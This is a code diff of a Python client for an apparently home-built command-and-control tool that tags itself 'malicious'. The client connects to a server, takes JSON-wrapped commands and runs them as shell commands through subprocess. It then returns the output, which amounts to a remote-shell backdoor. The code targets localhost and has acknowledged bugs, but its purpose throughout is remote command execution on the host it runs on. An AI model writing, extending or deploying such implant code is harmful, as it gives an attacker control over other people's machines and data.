@@ -5,9 +5,12 @@ import time
 import random
 import string
 import subprocess
+import json
 
 logging.basicConfig(level=logging.DEBUG)
 logging.basicConfig(filename='client.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s', force=True)
+logging.getLogger().addHandler(logging.StreamHandler())
+
 class MClient:
 
     def __init__(self, ip="127.0.0.1", port=80):
@@ -21,15 +24,34 @@ class MClient:
         self.client_id = MClient.generate_client_id()
 
         while True:
+            #connect to server
             self.connected_socket = MClient.connect_to_server(ip=self.ip, port=self.port)
+            #send ID
             self.send_identification_to_server(conn=self.connected_socket)
+            # recieve MSG
             msg_from_server = self.recieve_msg(conn=self.connected_socket)
             #print(msg_from_server)
             logging.debug(f"[MClient Python (run)] Message From server: {msg_from_server}")
-            client_results = self.decision_tree(msg_from_server)
-            self.send_msg(client_results, self.connected_socket)
+
+            ## if there's a json exception/error...
+            converted_msg_from_server = self.json_convert(msg_from_server)
+            if not converted_msg_from_server:
+                continue
+
+            ## pass parsed msg to the decision tree
+            client_results = self.decision_tree(
+                command = converted_msg_from_server["Main"]["msg"]["msg_content"]["command"],
+                command_value = converted_msg_from_server["Main"]["msg"]["msg_content"]["value"]
+            )
+
+            ## convert results of running command back to JSON
+            json_client_results = self.json_format(cmd_value=client_results)
+
+            ## and send that stringified json object back
+            self.send_msg(json_client_results, self.connected_socket)
             # disconnect
             #time.sleep(heartbeat)
+            ## simple as that
 
 
     @staticmethod
@@ -48,15 +70,19 @@ class MClient:
 
     def send_identification_to_server(self, conn=socket):
         """ Sends client id to server, the loop catches the response & handles it
-        A note, the header DOES NOT need to be sent for this initial ID, yes, it needs to be fixed, but for
-        now no header on first contact
-        """
-        conn.send(self.str_encode(f"!_client_!\\|/{self.client_id}\\|/{self.client_id}"))
 
-    def decision_tree(self, command=""):
+            Note, the previous comments said that the header does not need to be sent, however
+            that was fixed, and everything *should* be using WIWP for communication
+        """
+        #conn.send(self.str_encode(f"!_client_!\\|/{self.client_id}\\|/{self.client_id}"))
+        self.send_msg(self.json_format(client_id=self.client_id, action="!_clientlogin_!", msg_to="server"),
+                      conn=self.connected_socket)
+
+    def decision_tree(self, command="", command_value=""):
         print(f"command from server: {command}")
         if command.lower() == "session":
             while True:
+                print("Listening for next command...")
                 session_command = self.recieve_msg(self.connected_socket)
                 if session_command.lower() == "break":
                     return "session breaking"
@@ -64,6 +90,7 @@ class MClient:
                 else:
                     session_command_results = self.decision_tree(command=session_command)
                     return session_command_results
+                print(f"session_command: {command}")
                     #self.send_msg(session_command_results)
 
         elif command == "" or command.lower() == "help":
@@ -75,8 +102,17 @@ class MClient:
             return help_command
 
         elif "run-command" in command.lower():
-            system_command = command.replace("run-command","")
-            return System.run_command(system_command)
+            system_command = command_value #command.replace("run-command","") old way of doing it
+            print(f"[Client (run-command)]results: {system_command}")
+
+            ## broekn
+            system_command_result = System.run_command(system_command)
+
+            if system_command_result == "":
+                return f"Command seemingly returned no results: {system_command_result}"
+            else:
+                return System.run_command(system_command)
+            #return "This is where a run-command result would go IF not fcking broken"
 
     @staticmethod
     def generate_client_id():
@@ -154,6 +190,71 @@ class MClient:
         encoded_result = input.encode()
         return encoded_result
 
+    def json_format(self, action="", cmd="empty", cmd_value="empty", msg_to="", client_id=""):
+        '''
+        JSON formatter for sending messages to the server
+
+        Returns a json object
+
+        '''
+
+        ## Expanded our here for readability
+        user_msg_to_be_sent = {
+            "Main": {
+                "general": {
+                    "action": action,
+                    "client_id": client_id,
+                    "client_type": "malicious",
+                    "password": "empty"
+                },
+                "conn": {
+                    "client_ip": self.ip,
+                    "client_port": self.port
+                },
+                "msg": {
+                    "msg_to": "msg_to",
+                    "msg_content": {
+                        "command": cmd,
+                        "value": cmd_value
+                    },
+                    "msg_length": 1234,
+                    "msg_hash": "hash of message (later)"
+                },
+                "stats": {
+                    "latest_checkin": "time.now",
+                    "device_hostname": "hostname",
+                    "device_username": "username"
+                },
+                "security": {
+                    "client_hash": "hash of client (later)",
+                    "server_hash": "hash of server (later)"
+                }
+            }
+        }
+
+        return json.dumps(user_msg_to_be_sent)
+
+    def json_convert(self, json_string=""):
+        """
+        Converts received msg from JSON to a python dict
+        returns said dict
+        """
+        json_object = None
+        ## Sanity check to make sure JSON is actually JSON b4 passing into validator
+        try:
+            # Python Obj             #raw JSON
+            json_object = json.loads(json_string)
+            return json_object
+
+        except json.JSONDecodeError as e:
+            print(f"JSON data is not valid. Error message: {e}")
+            return False
+
+        except Exception as e:
+            print(f"error with JSON: {e}")
+            return False
+
+
 class System:
     @staticmethod
     def run_command(command):
@@ -163,11 +264,11 @@ class System:
                 universal_newlines=True)
             return output
         except subprocess.CalledProcessError as exc:
-            return f"{exc.returncode, exc.output}"
+            return f"[run_command] Err: {exc.returncode, exc.output}"
         except Exception as e:
-            return f"[CompilationWrapper(GCC: compile)] Unknown Error when compiling: {e}"
+            return f"[run_command] Unknown Error: {e}"
 
 #client = MClient(ip="IPADDRESS",port=PORT)
 
-client = MClient(ip="127.0.0.1",port=100)
+client = MClient(ip="127.0.0.1",port=8080)
 client.run()
